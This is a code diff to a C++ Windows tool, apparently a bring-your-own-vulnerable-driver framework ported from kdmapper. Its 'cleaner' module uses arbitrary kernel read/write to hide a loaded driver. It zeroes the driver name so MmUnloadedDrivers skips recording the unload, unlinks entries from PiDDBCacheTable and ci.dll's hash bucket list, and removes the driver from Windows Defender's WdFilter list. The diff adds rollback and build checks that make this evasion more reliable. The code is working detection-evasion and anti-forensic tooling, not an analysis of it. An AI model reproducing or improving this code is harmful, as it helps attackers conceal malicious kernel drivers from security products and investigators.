@@ -11,6 +11,7 @@
 #include <cstdio>
 #include <fstream>
 #include <filesystem>
+#include <unordered_set>
 
 // Kernel structure layouts and pattern bytes below are ported from
 // TheCruZ/kdmapper (intel_driver.cpp / nt.hpp, MIT), validated live against
@@ -104,9 +105,33 @@ static uint64_t FindModuleBase(const wchar_t* moduleName) {
 // wrong pattern match must never become a wild kernel access or call.
 static bool IsInModule(uint64_t moduleBase, uint64_t va) {
     for (const auto& m : kmem::EnumKernelModules()) {
-        if (m.base == moduleBase) return va >= moduleBase && va < moduleBase + m.size;
+        if (m.base == moduleBase && m.size <= UINT64_MAX - moduleBase)
+            return va >= moduleBase && va < moduleBase + m.size;
     }
     return false;
+}
+
+static bool IsSupportedCleanerBuild(uint32_t build) {
+    switch (build) {
+        case 19041: case 19042: case 19043: case 19044: case 19045:
+        case 22000: case 22621: case 22631: case 26100: case 26200:
+            return true;
+        default:
+            return false;
+    }
+}
+
+static bool IsSupportedUnloadPreventionBuild() {
+    // The private KLDR_DATA_TABLE_ENTRY offset below has been disassembled and
+    // validated only on the Win11 26200 family. A base build number is the
+    // strongest version identity available through RtlGetVersion here; every
+    // other build fails closed rather than zeroing an unrelated pool object.
+    const auto os = kmem::GetOsVersion();
+    return os.major == 10 && os.build == 26200;
+}
+
+static bool IsKernelPointer(uint64_t value) {
+    return value != 0 && (value >> 48) == 0xFFFF;
 }
 
 // Locate a section of a loaded module by name. Returns its kernel VA.
@@ -171,45 +196,92 @@ static uint64_t ResolveLeaTarget(byovd::IByovdBackend* backend, uint64_t leaVa) 
 // Kernel call wrappers (kmem::CallKernelFunction — NtAddAtom hook underneath)
 // ---------------------------------------------------------------------------
 
-static bool KAcquireResourceExclusive(byovd::IByovdBackend* backend, uint64_t lockVa) {
+static hinv::kmem::KernelCallStatus KAcquireResourceExclusive(
+    byovd::IByovdBackend* backend, uint64_t lockVa, bool& acquired) {
+    acquired = false;
     static uint64_t fn = 0;
     if (!fn) fn = kmem::ResolveKernelExport(backend, L"ntoskrnl.exe", "ExAcquireResourceExclusiveLite");
-    if (!fn) return false;
+    if (!fn) return kmem::KernelCallStatus::NotExecuted;
     uint8_t out = 0;
-    return kmem::CallKernelFunction(backend, &out, fn, lockVa, 1ULL) && out;
+    const auto status = kmem::CallKernelFunction(backend, &out, fn, lockVa, 1ULL);
+    acquired = status == kmem::KernelCallStatus::Executed && out != 0;
+    return status;
 }
 
-static bool KReleaseResource(byovd::IByovdBackend* backend, uint64_t lockVa) {
+static kmem::KernelCallStatus KReleaseResource(byovd::IByovdBackend* backend, uint64_t lockVa) {
     static uint64_t fn = 0;
     if (!fn) fn = kmem::ResolveKernelExport(backend, L"ntoskrnl.exe", "ExReleaseResourceLite");
-    if (!fn) return false;
+    if (!fn) return kmem::KernelCallStatus::NotExecuted;
     return kmem::CallKernelFunction<void>(backend, nullptr, fn, lockVa);
 }
 
-static uint64_t KLookupAvl(byovd::IByovdBackend* backend, uint64_t tableVa, void* userEntry) {
+static kmem::KernelCallStatus KLookupAvl(byovd::IByovdBackend* backend, uint64_t tableVa,
+                                         void* userEntry, uint64_t& outEntry) {
+    outEntry = 0;
     static uint64_t fn = 0;
     if (!fn) fn = kmem::ResolveKernelExport(backend, L"ntoskrnl.exe", "RtlLookupElementGenericTableAvl");
-    if (!fn) return 0;
-    uint64_t out = 0;
-    if (!kmem::CallKernelFunction(backend, &out, fn, tableVa, reinterpret_cast<uint64_t>(userEntry)))
-        return 0;
-    return out;
+    if (!fn) return kmem::KernelCallStatus::NotExecuted;
+    const auto status = kmem::CallKernelFunction(
+        backend, &outEntry, fn, tableVa, reinterpret_cast<uint64_t>(userEntry));
+    return status;
 }
 
-static bool KDeleteAvl(byovd::IByovdBackend* backend, uint64_t tableVa, uint64_t entryVa) {
+static kmem::KernelCallStatus KDeleteAvl(byovd::IByovdBackend* backend, uint64_t tableVa,
+                                         uint64_t entryVa, bool& deleted) {
+    deleted = false;
     static uint64_t fn = 0;
     if (!fn) fn = kmem::ResolveKernelExport(backend, L"ntoskrnl.exe", "RtlDeleteElementGenericTableAvl");
-    if (!fn) return false;
+    if (!fn) return kmem::KernelCallStatus::NotExecuted;
     uint8_t out = 0;
-    return kmem::CallKernelFunction(backend, &out, fn, tableVa, entryVa) && out;
+    const auto status = kmem::CallKernelFunction(backend, &out, fn, tableVa, entryVa);
+    deleted = status == kmem::KernelCallStatus::Executed && out != 0;
+    return status;
 }
 
-static bool KFreePool(byovd::IByovdBackend* backend, uint64_t va) {
+static kmem::KernelCallStatus KFreePool(byovd::IByovdBackend* backend, uint64_t va) {
     static uint64_t fn = 0;
     if (!fn) fn = kmem::ResolveKernelExport(backend, L"ntoskrnl.exe", "ExFreePool");
-    if (!fn) return false;
+    if (!fn) return kmem::KernelCallStatus::NotExecuted;
     return kmem::CallKernelFunction<void>(backend, nullptr, fn, va);
 }
+
+class ExclusiveResourceGuard {
+public:
+    ExclusiveResourceGuard(byovd::IByovdBackend* backend, uint64_t lockVa)
+        : backend_(backend), lockVa_(lockVa) {}
+
+    ExclusiveResourceGuard(const ExclusiveResourceGuard&) = delete;
+    ExclusiveResourceGuard& operator=(const ExclusiveResourceGuard&) = delete;
+
+    bool Release() {
+        if (!acquired_ || released_) return releaseStatus_ == kmem::KernelCallStatus::Executed;
+        if (kernelStateUncertain_) return false;
+        releaseStatus_ = KReleaseResource(backend_, lockVa_);
+        released_ = true;
+        return releaseStatus_ == kmem::KernelCallStatus::Executed;
+    }
+
+    void MarkAcquired() { acquired_ = true; }
+    void MarkKernelStateUncertain() { kernelStateUncertain_ = true; }
+
+    ~ExclusiveResourceGuard() {
+        // All normal paths call Release so its status is propagated. The
+        // destructor is the last line of defence for early returns and still
+        // attempts the release while the backend is alive.
+        if (acquired_ && !released_ && !kernelStateUncertain_) {
+            releaseStatus_ = KReleaseResource(backend_, lockVa_);
+            released_ = true;
+        }
+    }
+
+private:
+    byovd::IByovdBackend* backend_ = nullptr;
+    uint64_t lockVa_ = 0;
+    bool acquired_ = false;
+    bool released_ = false;
+    bool kernelStateUncertain_ = false;
+    kmem::KernelCallStatus releaseStatus_ = kmem::KernelCallStatus::NotExecuted;
+};
 
 // ---------------------------------------------------------------------------
 // Driver file timestamp (for the PiDDB AVL lookup)
@@ -250,10 +322,17 @@ bool ClearUnloadedDriverEntry(byovd::IByovdBackend* backend, const std::wstring&
     return false;
 }
 
-bool PreventUnloadedDriverTrace(byovd::IByovdBackend* backend, HANDLE deviceHandle) {
+bool PreventUnloadedDriverTrace(byovd::IByovdBackend* backend, HANDLE deviceHandle,
+                                UnloadPreventionState* state) {
     kmem::Trace("cleaner: prevent begin");
-    if (!backend || !deviceHandle || deviceHandle == INVALID_HANDLE_VALUE) {
+    if (state) *state = {};
+    if (!state || !backend || !deviceHandle || deviceHandle == INVALID_HANDLE_VALUE) {
         kmem::Trace("cleaner: prevent bail (args)");
+        return false;
+    }
+    if (!IsSupportedUnloadPreventionBuild()) {
+        std::wcerr << L"[hinv::cleaner] MmUnloadedDrivers prevention is disabled on this Windows build\n";
+        kmem::Trace("cleaner: prevent bail (unsupported build)");
         return false;
     }
 
@@ -284,6 +363,14 @@ bool PreventUnloadedDriverTrace(byovd::IByovdBackend* backend, HANDLE deviceHand
 
     uint64_t fileObject = 0;
     auto* info = reinterpret_cast<SystemHandleInformationEx*>(buffer.data());
+    const size_t headerSize = offsetof(SystemHandleInformationEx, Handles);
+    const size_t maxHandles = buffer.size() >= headerSize
+        ? (buffer.size() - headerSize) / sizeof(SystemHandle)
+        : 0;
+    if (info->HandleCount > maxHandles) {
+        kmem::Trace("cleaner: prevent bail (handle table bounds)");
+        return false;
+    }
     for (size_t i = 0; i < info->HandleCount; ++i) {
         const auto& h = info->Handles[i];
         if (h.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(GetCurrentProcessId())))
@@ -298,31 +385,69 @@ bool PreventUnloadedDriverTrace(byovd::IByovdBackend* backend, HANDLE deviceHand
     // FILE_OBJECT +0x8 -> DEVICE_OBJECT +0x8 -> DRIVER_OBJECT +0x28 ->
     // KLDR_DATA_TABLE_ENTRY; its BaseDllName UNICODE_STRING lives at +0x58.
     uint64_t deviceObject = 0, driverObject = 0, driverSection = 0;
-    if (!kmem::ReadU64(backend, fileObject + 0x8, deviceObject) || !deviceObject) {
+    if (!IsKernelPointer(fileObject) ||
+        !kmem::ReadU64(backend, fileObject + 0x8, deviceObject) ||
+        !IsKernelPointer(deviceObject)) {
         kmem::Trace("cleaner: prevent bail (device)"); return false;
     }
-    if (!kmem::ReadU64(backend, deviceObject + 0x8, driverObject) || !driverObject) {
+    if (!kmem::ReadU64(backend, deviceObject + 0x8, driverObject) ||
+        !IsKernelPointer(driverObject)) {
         kmem::Trace("cleaner: prevent bail (driver)"); return false;
     }
-    if (!kmem::ReadU64(backend, driverObject + 0x28, driverSection) || !driverSection) {
+    if (!kmem::ReadU64(backend, driverObject + 0x28, driverSection) ||
+        !IsKernelPointer(driverSection)) {
         kmem::Trace("cleaner: prevent bail (section)"); return false;
     }
 
     UNICODE_STRING name{};
-    if (!backend->ReadKernelMemory(driverSection + 0x58, &name, sizeof(name)) || name.Length == 0) {
+    const uint64_t nameFieldVa = driverSection + 0x58;
+    if (!backend->ReadKernelMemory(nameFieldVa, &name, sizeof(name)) ||
+        name.Length == 0 || (name.Length & 1) != 0 ||
+        name.MaximumLength < name.Length || name.Length > 1024 ||
+        !IsKernelPointer(reinterpret_cast<uint64_t>(name.Buffer))) {
         kmem::Trace("cleaner: prevent bail (name)"); return false;
     }
 
     std::vector<wchar_t> nameBuf(name.Length / 2 + 1, 0);
-    backend->ReadKernelMemory(reinterpret_cast<uint64_t>(name.Buffer), nameBuf.data(), name.Length);
+    if (!backend->ReadKernelMemory(reinterpret_cast<uint64_t>(name.Buffer),
+                                   nameBuf.data(), name.Length)) {
+        kmem::Trace("cleaner: prevent bail (name read)");
+        return false;
+    }
     std::wcout << L"[hinv::cleaner] Arming MmUnloadedDrivers prevention for " << nameBuf.data() << L"\n";
 
     // Length == 0 makes MiRememberUnloadedDriver skip recording the unload.
     UNICODE_STRING zeroed = name;
     zeroed.Length = 0;
-    bool ok = backend->WriteKernelMemory(driverSection + 0x58, &zeroed, sizeof(zeroed));
+    bool ok = backend->WriteKernelMemory(nameFieldVa, &zeroed, sizeof(zeroed));
+    if (ok) {
+        UNICODE_STRING verify{};
+        ok = backend->ReadKernelMemory(nameFieldVa, &verify, sizeof(verify)) &&
+             verify.Length == 0 && verify.Buffer == name.Buffer &&
+             verify.MaximumLength == name.MaximumLength;
+    }
+    if (ok && state) {
+        state->armed = true;
+        state->nameFieldVa = nameFieldVa;
+        state->originalName = name;
+    }
     kmem::Trace(ok ? "cleaner: unload prevention armed" : "cleaner: unload prevention failed");
     return ok;
+}
+
+bool RestoreUnloadedDriverTrace(byovd::IByovdBackend* backend,
+                                UnloadPreventionState& state) {
+    if (!state.armed) return true;
+    if (!backend || !state.nameFieldVa) return false;
+    if (!backend->WriteKernelMemory(state.nameFieldVa, &state.originalName,
+                                    sizeof(state.originalName)))
+        return false;
+    UNICODE_STRING verify{};
+    if (!backend->ReadKernelMemory(state.nameFieldVa, &verify, sizeof(verify)) ||
+        std::memcmp(&verify, &state.originalName, sizeof(verify)) != 0)
+        return false;
+    state = {};
+    return true;
 }
 
 // ---------------------------------------------------------------------------
@@ -330,7 +455,7 @@ bool PreventUnloadedDriverTrace(byovd::IByovdBackend* backend, HANDLE deviceHand
 // ---------------------------------------------------------------------------
 
 bool ClearPiDddbCache(byovd::IByovdBackend* backend, const std::wstring& driverName, uint32_t driverFileTimestamp) {
-    if (!backend || driverName.empty()) return false;
+    if (!backend || driverName.empty() || !kmem::KernelCallsUsable()) return false;
 
     uint64_t ntosBase = FindModuleBase(L"ntoskrnl.exe");
     if (!ntosBase) return false;
@@ -406,10 +531,14 @@ bool ClearPiDddbCache(byovd::IByovdBackend* backend, const std::wstring& driverN
     std::cout << "[hinv::cleaner] PiDDBLock=0x" << std::hex << lockVa << " PiDDBCacheTable=0x" << tableVa << std::dec << "\n";
 
     kmem::Trace("cleaner: piddb lock acquire");
-    if (!KAcquireResourceExclusive(backend, lockVa)) {
+    bool acquired = false;
+    const auto acquireStatus = KAcquireResourceExclusive(backend, lockVa, acquired);
+    if (acquireStatus != kmem::KernelCallStatus::Executed || !acquired) {
         std::wcerr << L"[hinv::cleaner] Failed to lock PiDDBLock\n";
         return false;
     }
+    ExclusiveResourceGuard resource(backend, lockVa);
+    resource.MarkAcquired();
     kmem::Trace("cleaner: piddb locked");
 
     bool cleaned = false;
@@ -431,7 +560,13 @@ bool ClearPiDddbCache(byovd::IByovdBackend* backend, const std::wstring& driverN
         local.DriverName.Length = static_cast<USHORT>(variant.size() * sizeof(wchar_t));
         local.DriverName.MaximumLength = local.DriverName.Length + sizeof(wchar_t);
 
-        uint64_t entry = KLookupAvl(backend, tableVa, &local);
+        uint64_t entry = 0;
+        const auto lookupStatus = KLookupAvl(backend, tableVa, &local, entry);
+        if (lookupStatus != kmem::KernelCallStatus::Executed) {
+            if (lookupStatus == kmem::KernelCallStatus::RestorationUncertain)
+                resource.MarkKernelStateUncertain();
+            break;
+        }
         if (!entry) continue;
 
         std::cout << "[hinv::cleaner] PiDDB entry found at 0x" << std::hex << entry << std::dec << "\n";
@@ -443,23 +578,47 @@ bool ClearPiDddbCache(byovd::IByovdBackend* backend, const std::wstring& driverN
             !kmem::ReadU64(backend, entry + offsetof(PiDDBCacheEntry, List.Flink), next) || !prev || !next)
             break;
 
-        if (!kmem::WriteU64(backend, prev + offsetof(LIST_ENTRY, Flink), next) ||
-            !kmem::WriteU64(backend, next + offsetof(LIST_ENTRY, Blink), prev))
+        uint64_t prevNext = 0, nextPrev = 0;
+        if (!kmem::ReadU64(backend, prev + offsetof(LIST_ENTRY, Flink), prevNext) ||
+            !kmem::ReadU64(backend, next + offsetof(LIST_ENTRY, Blink), nextPrev) ||
+            prevNext != entry || nextPrev != entry) {
+            std::wcerr << L"[hinv::cleaner] PiDDB list links failed validation\n";
             break;
-
-        if (!KDeleteAvl(backend, tableVa, entry)) break;
-        kmem::Trace("cleaner: piddb avl deleted");
-
-        uint32_t deleteCount = 0;
-        if (kmem::ReadU32(backend, tableVa + offsetof(KRTL_AVL_TABLE, DeleteCount), deleteCount) && deleteCount > 0) {
-            deleteCount--;
-            kmem::WriteU32(backend, tableVa + offsetof(KRTL_AVL_TABLE, DeleteCount), deleteCount);
         }
+
+        auto restoreList = [&]() {
+            bool ok = kmem::WriteU64(backend, prev + offsetof(LIST_ENTRY, Flink), entry);
+            ok = kmem::WriteU64(backend, next + offsetof(LIST_ENTRY, Blink), entry) && ok;
+            return ok;
+        };
+
+        if (!kmem::WriteU64(backend, prev + offsetof(LIST_ENTRY, Flink), next))
+            break;
+        if (!kmem::WriteU64(backend, next + offsetof(LIST_ENTRY, Blink), prev)) {
+            if (!kmem::WriteU64(backend, prev + offsetof(LIST_ENTRY, Flink), entry))
+                resource.MarkKernelStateUncertain();
+            break;
+        }
+
+        bool deleted = false;
+        const auto deleteStatus = KDeleteAvl(backend, tableVa, entry, deleted);
+        if (deleteStatus != kmem::KernelCallStatus::Executed || !deleted) {
+            std::wcerr << L"[hinv::cleaner] PiDDB AVL delete state is uncertain; aborting\n";
+            const bool listRestored = restoreList();
+            if (deleteStatus == kmem::KernelCallStatus::RestorationUncertain || !listRestored)
+                resource.MarkKernelStateUncertain();
+            break;
+        }
+        kmem::Trace("cleaner: piddb avl deleted");
         cleaned = true;
         break;
     }
 
-    KReleaseResource(backend, lockVa);
+    const bool releaseOk = resource.Release();
+    if (!releaseOk) {
+        std::wcerr << L"[hinv::cleaner] Failed to release PiDDBLock\n";
+        return false;
+    }
     kmem::Trace(cleaned ? "cleaner: piddb done (cleaned)" : "cleaner: piddb done (not found)");
 
     if (cleaned) std::wcout << L"[hinv::cleaner] PiDDBCacheTable cleaned for " << driverName << L"\n";
@@ -471,7 +630,7 @@ bool ClearPiDddbCache(byovd::IByovdBackend* backend, const std::wstring& driverN
 // ---------------------------------------------------------------------------
 
 bool ClearKernelHashBucketList(byovd::IByovdBackend* backend, const std::wstring& driverName) {
-    if (!backend || driverName.empty()) return false;
+    if (!backend || driverName.empty() || !kmem::KernelCallsUsable()) return false;
 
     uint64_t ciBase = FindModuleBase(L"ci.dll");
     if (!ciBase) return false;
@@ -525,10 +684,14 @@ bool ClearKernelHashBucketList(byovd::IByovdBackend* backend, const std::wstring
               << " g_HashCacheLock=0x" << hashLockVa << std::dec << "\n";
 
     kmem::Trace("cleaner: hashbucket lock acquire");
-    if (!KAcquireResourceExclusive(backend, hashLockVa)) {
+    bool acquired = false;
+    const auto acquireStatus = KAcquireResourceExclusive(backend, hashLockVa, acquired);
+    if (acquireStatus != kmem::KernelCallStatus::Executed || !acquired) {
         std::wcerr << L"[hinv::cleaner] Failed to lock g_HashCacheLock\n";
         return false;
     }
+    ExclusiveResourceGuard resource(backend, hashLockVa);
+    resource.MarkAcquired();
     kmem::Trace("cleaner: hashbucket locked");
 
     bool cleaned = false;
@@ -542,8 +705,13 @@ bool ClearKernelHashBucketList(byovd::IByovdBackend* backend, const std::wstring
 
     uint64_t prev = bucketListVa; // the global holds the first entry pointer
     uint64_t entry = 0;
+    std::unordered_set<uint64_t> visited;
     if (kmem::ReadU64(backend, prev, entry)) {
-        while (entry) {
+        for (int iterations = 0; entry; ++iterations) {
+            if (iterations >= 4096 || !visited.insert(entry).second) {
+                std::wcerr << L"[hinv::cleaner] g_HashCacheList cycle/length limit reached\n";
+                break;
+            }
             uint16_t nameLen = 0;
             if (!backend->ReadKernelMemory(entry + offsetof(HashBucketEntry, DriverName.Length), &nameLen, sizeof(nameLen)) || !nameLen)
                 break;
@@ -560,9 +728,19 @@ bool ClearKernelHashBucketList(byovd::IByovdBackend* backend, const std::wstring
             if (entryName == fileName || (!stem.empty() && entryName == stem)) {
                 uint64_t next = 0;
                 if (!kmem::ReadU64(backend, entry, next)) break;
+                uint64_t current = 0;
+                if (!kmem::ReadU64(backend, prev, current) || current != entry) break;
                 if (!kmem::WriteU64(backend, prev, next)) break;
                 kmem::Trace("cleaner: hashbucket entry unlinked");
-                if (!KFreePool(backend, entry)) break;
+                const auto freeStatus = KFreePool(backend, entry);
+                if (freeStatus != kmem::KernelCallStatus::Executed) {
+                    if (freeStatus == kmem::KernelCallStatus::RestorationUncertain) {
+                        resource.MarkKernelStateUncertain();
+                    } else if (!kmem::WriteU64(backend, prev, entry)) {
+                        resource.MarkKernelStateUncertain();
+                    }
+                    break;
+                }
                 cleaned = true;
                 break;
             }
@@ -572,7 +750,10 @@ bool ClearKernelHashBucketList(byovd::IByovdBackend* backend, const std::wstring
         }
     }
 
-    KReleaseResource(backend, hashLockVa);
+    if (!resource.Release()) {
+        std::wcerr << L"[hinv::cleaner] Failed to release g_HashCacheLock\n";
+        return false;
+    }
 
     if (cleaned) std::wcout << L"[hinv::cleaner] g_KernelHashBucketList cleaned for " << driverName << L"\n";
     return cleaned;
@@ -583,7 +764,7 @@ bool ClearKernelHashBucketList(byovd::IByovdBackend* backend, const std::wstring
 // ---------------------------------------------------------------------------
 
 bool ClearWdFilterDriverList(byovd::IByovdBackend* backend, const std::wstring& driverName) {
-    if (!backend || driverName.empty()) return false;
+    if (!backend || driverName.empty() || !kmem::KernelCallsUsable()) return false;
 
     uint64_t wdfBase = FindModuleBase(L"wdfilter.sys");
     if (!wdfBase) {
@@ -678,11 +859,12 @@ bool ClearWdFilterDriverList(byovd::IByovdBackend* backend, const std::wstring& 
     uint64_t entry = 0;
     if (!kmem::ReadU64(backend, runtimeDriversListHead, entry) || !entry) return false;
 
-    // Cap the walk: a corrupted list (self-referencing Flink) must never hang
-    // usermode forever.
+    // Cap the walk and detect cycles: a corrupted list must never hang
+    // usermode while an exclusive kernel structure is being edited.
+    std::unordered_set<uint64_t> visited;
     for (int iterations = 0; entry != runtimeDriversListHead; ++iterations) {
-        if (iterations > 4096) {
-            std::wcerr << L"[hinv::cleaner] WdFilter list walk exceeded 4096 entries, aborting\n";
+        if (iterations >= 4096 || !visited.insert(entry).second) {
+            std::wcerr << L"[hinv::cleaner] WdFilter list cycle/length limit reached, aborting\n";
             return false;
         }
         UNICODE_STRING us{};
@@ -699,31 +881,72 @@ bool ClearWdFilterDriverList(byovd::IByovdBackend* backend, const std::wstring& 
             continue;
         }
 
-        // Remove from the array: find the slot pointing at Entry - 0x10.
+        uint64_t next = 0, prev = 0;
+        if (!kmem::ReadU64(backend, entry + offsetof(LIST_ENTRY, Flink), next) ||
+            !kmem::ReadU64(backend, entry + offsetof(LIST_ENTRY, Blink), prev) ||
+            !next || !prev)
+            return false;
+        uint64_t nextPrev = 0, prevNext = 0;
+        if (!kmem::ReadU64(backend, next + offsetof(LIST_ENTRY, Blink), nextPrev) ||
+            !kmem::ReadU64(backend, prev + offsetof(LIST_ENTRY, Flink), prevNext) ||
+            nextPrev != entry || prevNext != entry)
+            return false;
+
+        // Find the array slot first, but do not modify it until the list
+        // unlink has been completed. Every intermediate write has a complete
+        // rollback path while the entry is still allocated.
         uint64_t sameIndexList = entry - 0x10;
+        uint64_t arraySlot = 0;
+        uint64_t oldArrayValue = 0;
         bool removedFromArray = false;
         for (int k = 0; k < 256; ++k) {
             uint64_t value = 0;
             if (!kmem::ReadU64(backend, runtimeDriversArray + k * 8, value)) break;
             if (value == sameIndexList) {
-                uint64_t emptyVal = runtimeDriversCount + 1; // kdmapper: position marker, not count+1
-                if (!kmem::WriteU64(backend, runtimeDriversArray + k * 8, emptyVal)) return false;
+                arraySlot = runtimeDriversArray + k * 8;
+                oldArrayValue = value;
                 removedFromArray = true;
                 break;
             }
         }
         if (!removedFromArray) return false;
 
-        uint64_t next = 0, prev = 0;
-        if (!kmem::ReadU64(backend, entry + offsetof(LIST_ENTRY, Flink), next) ||
-            !kmem::ReadU64(backend, entry + offsetof(LIST_ENTRY, Blink), prev)) return false;
-        if (!kmem::WriteU64(backend, next + offsetof(LIST_ENTRY, Blink), prev) ||
-            !kmem::WriteU64(backend, prev + offsetof(LIST_ENTRY, Flink), next)) return false;
+        uint32_t oldCount = 0;
+        if (!kmem::ReadU32(backend, runtimeDriversCount, oldCount) || oldCount == 0)
+            return false;
 
-        uint32_t count = 0;
-        if (kmem::ReadU32(backend, runtimeDriversCount, count) && count > 0) {
-            count--;
-            kmem::WriteU32(backend, runtimeDriversCount, count);
+        bool listChanged = false;
+        bool arrayChanged = false;
+        auto rollback = [&]() {
+            bool ok = true;
+            if (arrayChanged)
+                ok = kmem::WriteU64(backend, arraySlot, oldArrayValue) && ok;
+            if (listChanged) {
+                ok = kmem::WriteU64(backend, next + offsetof(LIST_ENTRY, Blink), entry) && ok;
+                ok = kmem::WriteU64(backend, prev + offsetof(LIST_ENTRY, Flink), entry) && ok;
+            }
+            return ok;
+        };
+
+        if (!kmem::WriteU64(backend, next + offsetof(LIST_ENTRY, Blink), prev))
+            return false;
+        listChanged = true;
+        if (!kmem::WriteU64(backend, prev + offsetof(LIST_ENTRY, Flink), next)) {
+            if (!rollback()) return false;
+            return false;
+        }
+
+        const uint64_t emptyVal = runtimeDriversCount + 1; // position marker
+        if (!kmem::WriteU64(backend, arraySlot, emptyVal)) {
+            if (!rollback()) return false;
+            return false;
+        }
+        arrayChanged = true;
+
+        if (!kmem::WriteU32(backend, runtimeDriversCount, oldCount - 1)) {
+            if (!rollback() || !kmem::WriteU32(backend, runtimeDriversCount, oldCount))
+                return false;
+            return false;
         }
 
         // Release the driver info block only when the magic matches; kdmapper
@@ -732,7 +955,15 @@ bool ClearWdFilterDriverList(byovd::IByovdBackend* backend, const std::wstring& 
         uint16_t magic = 0;
         if (backend->ReadKernelMemory(driverInfo, &magic, sizeof(magic)) && magic == 0xDA18) {
             kmem::Trace("cleaner: wdfilter MpFreeDriverInfoEx call");
-            kmem::CallKernelFunction<void>(backend, nullptr, mpFreeDriverInfoEx, driverInfo);
+            const auto freeStatus = kmem::CallKernelFunction<void>(
+                backend, nullptr, mpFreeDriverInfoEx, driverInfo);
+            if (freeStatus != kmem::KernelCallStatus::Executed) {
+                if (freeStatus == kmem::KernelCallStatus::RestorationUncertain)
+                    return false;
+                if (!rollback() || !kmem::WriteU32(backend, runtimeDriversCount, oldCount))
+                    return false;
+                return false;
+            }
         } else {
             std::wcerr << L"[hinv::cleaner] WdFilter DriverInfo magic mismatch, free skipped\n";
         }
@@ -756,17 +987,43 @@ CleanResult CleanDriverTraces(byovd::IByovdBackend* backend, const std::wstring&
         return result;
     }
 
+    const auto os = kmem::GetOsVersion();
+    if (os.major != 10 || !IsSupportedCleanerBuild(os.build)) {
+        result.error = L"unsupported Windows build; refusing build-specific kernel pattern scans";
+        return result;
+    }
+
     std::wcout << L"[hinv::cleaner] Sanitizing traces for " << driverName << L"\n";
+    for (const auto& module : kmem::EnumKernelModules()) {
+        if (ToLower(module.name) == L"wdfilter.sys") {
+            result.wdFilterPresent = true;
+            break;
+        }
+    }
     kmem::Trace("cleaner: begin (piddb)");
     result.piDdbCache = ClearPiDddbCache(backend, driverName, driverFileTimestamp);
+    if (!kmem::KernelCallsUsable()) {
+        result.error = L"kernel-call restoration is uncertain; later cleaners were not started";
+        return result;
+    }
     kmem::Trace("cleaner: begin (hashbucket)");
     result.hashBucketList = ClearKernelHashBucketList(backend, driverName);
+    if (!kmem::KernelCallsUsable()) {
+        result.error = L"kernel-call restoration is uncertain; later cleaners were not started";
+        return result;
+    }
     kmem::Trace("cleaner: begin (wdfilter)");
     result.wdFilter = ClearWdFilterDriverList(backend, driverName);
     kmem::Trace("cleaner: all done");
+    if (!kmem::KernelCallsUsable())
+        result.error = L"kernel-call restoration is uncertain; teardown is blocked";
 
+    result.complete = result.piDdbCache && result.hashBucketList &&
+                      (!result.wdFilterPresent || result.wdFilter);
     if (!result.piDdbCache && !result.hashBucketList && !result.wdFilter) {
         result.error = L"no matching entries found (already clean?) or globals not located on this build; see log";
+    } else if (!result.complete) {
+        result.error = L"partial trace cleaning; one or more structures were not confirmed";
     }
     return result;
 }
